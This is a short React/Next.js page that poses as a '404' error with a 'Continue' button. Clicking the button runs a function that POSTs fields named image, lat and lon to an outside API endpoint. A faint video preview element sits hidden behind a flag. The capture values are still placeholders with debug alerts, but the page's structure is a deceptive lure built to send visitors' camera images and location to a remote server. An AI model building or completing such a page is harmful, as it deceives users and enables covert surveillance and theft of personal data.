"use client";
import { useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);

  async function captureAll() {
  alert("About to call API");

  try {
    const res = await fetch("https://qt-info.vercel.app/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image: "test",
        lat: 1,
        lon: 1
      })
    });

    alert("API response status: " + res.status);
  } catch (e) {
    alert("Fetch failed: " + e);
  }
}


  return (
    <div style={{ padding: 40, textAlign: "center" }}>
      <h1>404</h1>
      <p>Click here to continue</p>

      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          style={{
            width: 160,
            height: 160,
            opacity: 0.3,     // 👈 30% opacity (preview only)
            borderRadius: 12,
            marginBottom: 16
          }}
        />
      )}

      <button onClick={captureAll}>
        Continue
      </button>
    </div>
  );
}
